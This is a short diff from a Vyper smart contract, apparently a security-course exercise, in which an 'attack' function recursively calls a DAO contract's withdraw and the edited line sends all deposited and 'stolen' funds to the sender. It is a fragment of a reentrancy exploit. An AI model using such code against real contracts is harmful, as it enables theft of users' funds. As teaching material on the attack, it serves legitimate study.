@@ -46,7 +46,7 @@ def attack(dao_address:address):
         DAO(dao_address).withdraw()
 
     # TODO: After the recursion has finished, send all funds (deposited and stolen) to the sender
-    send(msg.sender,owner_address.balance)
+    send(msg.sender,self.owner_address.balance)
     
     pass
 
